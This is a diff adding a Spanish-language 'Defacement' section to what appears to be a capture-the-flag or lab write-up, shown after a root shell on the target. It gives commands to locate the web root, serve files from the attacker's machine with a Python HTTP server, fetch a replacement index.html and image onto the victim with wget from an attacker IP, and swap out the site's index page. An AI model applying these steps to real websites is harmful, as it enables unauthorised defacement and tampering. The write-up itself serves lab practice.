@@ -834,6 +834,25 @@ drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
 bash-4.3# 
 ```
 
+## Defacement
+
+
+- Lo más fácil es buscar por `/var/www` o cualquier directorio que sabemos que existe en la URL, como "internal"
+
+    - `find / -type d -name 'internal'` 
+
+- Ahora solo hay ue crear un servidor http en python para descargar mis archvos a su servidor:
+
+    - `python3 -m http.server 8000`   
+
+- Descargo desde la víctima mi `index.html` y mi imagen `fz3r0_hell_0.jpg`  
+
+    - `wget http://10.6.22.157:8000/index.html`  
+    - `wget http://10.6.22.157:8000/fz3r0_hell_0.jpg`
+
+- Elimino o cambio el nombre del index original y listo! Defacement de URL  
+
+
 ## PoC
 
 - I'm Fz3r0 and the Sun no longer rises...
